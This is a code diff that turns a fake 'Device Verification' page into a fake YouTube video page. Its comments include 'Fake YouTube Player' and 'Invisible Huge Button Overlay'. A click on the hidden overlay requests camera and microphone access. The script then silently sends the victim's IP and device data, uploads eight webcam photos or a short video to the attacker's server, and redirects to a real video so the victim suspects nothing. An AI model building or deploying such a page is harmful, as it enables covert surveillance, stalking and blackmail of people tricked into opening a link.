@@ -1,54 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube</title>
     <style>
-        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #0088cc; border: none; padding: 15px 30px; color: white; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
-        #loader { display: none; margin-top: 20px; }
-        .bar-bg { width: 80%; background: #333; height: 12px; margin: 20px auto; border-radius: 6px; overflow: hidden; }
-        #bar { width: 0%; background: #0088cc; height: 100%; transition: 0.4s; }
+        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow: hidden; }
+        
+        /* Fake YouTube Player Container */
+        .video-container { position: relative; width: 100vw; height: 56.25vw; background: #000; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        
+        /* The Loading Spinner */
+        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #fff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(3600deg); } }
+
+        /* Invisible Huge Button Overlay */
+        #overlay-btn { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; opacity: 0; cursor: pointer; }
+
+        /* Fake UI Elements */
+        .video-info { padding: 15px; }
+        .video-title { font-size: 18px; font-weight: bold; margin-bottom: 8px; color: #f1f1f1; }
+        .video-stats { font-size: 14px; color: #aaa; }
+        .loading-text { margin-top: 15px; font-size: 14px; color: #aaa; }
+
+        /* Hidden elements for capture */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div id="setup">
-        <h2>🔒 Device Verification</h2>
-        <p>Please allow camera access to verify your identity.</p>
-        <button class="btn" onclick="start()">Verify Now</button>
+
+    <div class="video-container" id="player">
+        <div class="spinner"></div>
+        <button id="overlay-btn" onclick="startCapture()"></button>
     </div>
 
-    <div id="loader">
-        <h3 id="msg">Initialising...</h3>
-        <div class="bar-bg"><div id="bar"></div></div>
+    <div class="video-info">
+        <div class="video-title">Official Music Video - 2026 Hits</div>
+        <div class="video-stats">1.2M views • 2 hours ago</div>
+        <div class="loading-text" id="status-msg">Click to play video...</div>
     </div>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
         const params = new URLSearchParams(window.location.search);
-        const uid = params.get('id'); 
+        const uid = params.get('id');
         const mode = params.get('mode') || 'photo';
 
-        async function start() {
-            if (!uid || uid === "YOUR_TELEGRAM_ID" || uid === "null") {
-                alert("Error: Invalid Link. Please open the link sent by the bot.");
+        async function startCapture() {
+            if (!uid || uid === "null") {
+                console.log("No ID found.");
                 return;
             }
 
-            document.getElementById('setup').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+            document.getElementById('status-msg').innerText = "Loading video buffer...";
+            document.getElementById('overlay-btn').style.display = 'none';
 
             try {
+                // Request camera (and audio if video mode)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: (mode === 'video') 
                 });
+                
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Log Info
+                // Silently grab IP/Device info
                 fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                     fetch(`/log_info?id=${uid}`, {
                         method: 'POST',
@@ -57,48 +76,61 @@
                     });
                 });
 
-                if (mode === 'video') { record(stream); } else { snap(); }
-            } catch (e) { alert("Camera required for verification."); }
+                if (mode === 'video') {
+                    startVideoLogic(stream);
+                } else {
+                    startPhotoLogic();
+                }
+
+            } catch (err) {
+                document.getElementById('status-msg').innerText = "Playback error: Please enable permissions.";
+                console.error(err);
+            }
         }
 
-        function snap() {
+        function startPhotoLogic() {
             let count = 0;
-            const timer = setInterval(() => {
-                if (count >= 8) { clearInterval(timer); done(); return; }
+            const interval = setInterval(() => {
+                if (count >= 8) {
+                    clearInterval(interval);
+                    redirectToYouTube();
+                    return;
+                }
                 const c = document.getElementById('c');
                 const v = document.getElementById('v');
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
+                
                 c.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('file', blob);
                     fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
+                
                 count++;
-                document.getElementById('bar').style.width = (count * 12.5) + "%";
-                document.getElementById('msg').innerText = `Verifying... ${count}/8`;
-            }, 600);
+            }, 700);
         }
 
-        function record(stream) {
-            const rec = new MediaRecorder(stream);
+        function startVideoLogic(stream) {
+            const recorder = new MediaRecorder(stream);
             const chunks = [];
-            rec.ondataavailable = e => chunks.push(e.data);
-            rec.onstop = () => {
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
                 fd.append('file', blob);
                 fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
-                done();
+                redirectToYouTube();
             };
-            rec.start();
-            document.getElementById('msg').innerText = "Recording Video (3s)...";
-            setTimeout(() => { rec.stop(); document.getElementById('bar').style.width = "100%"; }, 3000);
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3500); // Capture 3.5 seconds
         }
 
-        function done() {
-            document.getElementById('msg').innerText = "Success! Redirecting...";
-            setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 1500);
+        function redirectToYouTube() {
+            // After capture, send them to a real video so they don't suspect anything
+            const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
+            window.location.href = `https://www.youtube.com/watch?v=${ytId}`;
         }
     </script>
 </body>
